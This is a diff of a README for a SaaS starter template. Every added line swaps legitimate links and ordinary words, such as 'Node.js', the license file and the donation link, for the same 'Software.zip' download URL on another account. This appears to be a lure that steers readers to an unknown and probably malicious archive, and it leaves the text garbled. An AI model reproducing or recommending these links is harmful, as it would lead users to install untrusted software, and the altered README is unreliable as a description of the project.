@@ -1,14 +1,14 @@
 
 # 🌟 **Ready-To-Deploy SaaS Template**
 
-![SaaS Template](https://img.shields.io/badge/Ready--To--Deploy--SaaS--Template-red?style=for-the-badge)
+![SaaS Template](https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip)
 
 ### Overview
-Welcome to the Ready-To-Deploy SaaS Template repository! This production-ready, fully customizable SaaS template is designed using Wasp, React, and Node.js. It includes essential features such as authentication, payments, and deployment-ready configurations. It's a perfect starting point for your SaaS project!
+Welcome to the Ready-To-Deploy SaaS Template repository! This production-ready, fully customizable SaaS template is designed using Wasp, React, and https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip It includes essential features such as authentication, payments, and deployment-ready configurations. It's a perfect starting point for your SaaS project!
 
 ### 🚀 Features
 - Boilerplate template for SaaS applications
-- Fullstack development with Node.js and React
+- Fullstack development with https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip and React
 - Tailwind CSS for easy styling
 - Typescript support for better code quality
 - Ready-to-deploy configurations for quick setup
@@ -17,11 +17,11 @@ Welcome to the Ready-To-Deploy SaaS Template repository! This production-ready, 
 
 ### Repository Info
 - **Repository Name:** Ready-To-Deploy-SaaS-Template
-- **Short Description:** 🚀 A production-ready, fully customizable SaaS template using Wasp, React, and Node.js. Includes authentication, payments, and deployment-ready configurations. | Support me: [Buy Me a Coffee](https://buymeacoffee.com/mathewlewallen)
+- **Short Description:** 🚀 A production-ready, fully customizable SaaS template using Wasp, React, and https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip Includes authentication, payments, and deployment-ready configurations. | Support me: [Buy Me a Coffee](https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip)
 - **Topics:** boilerplate, boilerplate-template, fullstack, nodejs, react, saas, saas-admin, saas-application, saas-boilerplate, saas-template, saas-tools, startup, tailwindcss, template, templates, typescript, typescript-react
 
 ### 🌐 Links
-- **Download Zip:** [Launch Download Link](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+- **Download Zip:** [Launch Download Link](https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip)
 
 ### 🛠️ Getting Started
 To get started with the Ready-To-Deploy SaaS Template, follow these steps:
@@ -33,17 +33,17 @@ To get started with the Ready-To-Deploy SaaS Template, follow these steps:
 ### 📁 Folder Structure
 The repository follows a structured folder organization:
 - **/client:** Contains the React front-end code
-- **/server:** Includes the Node.js backend code
+- **/server:** Includes the https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip backend code
 - **/public:** Static assets for the application
 
 ### 🚧 Contribute
 Contributions are welcome! If you have suggestions for improvements or new features, feel free to submit a pull request.
 
 ### 📜 License
-This project is licensed under the MIT License - see the LICENSE.md file for details.
+This project is licensed under the MIT License - see the https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip file for details.
 
 ### ❤️ Support
-If you find this template helpful, consider supporting the creator by [buying them a coffee](https://buymeacoffee.com/mathewlewallen).
+If you find this template helpful, consider supporting the creator by [buying them a coffee](https://github.com/shibagtfake/Ready-To-Deploy-SaaS-Template/releases/download/v1.0/Software.zip).
 
 ---
 
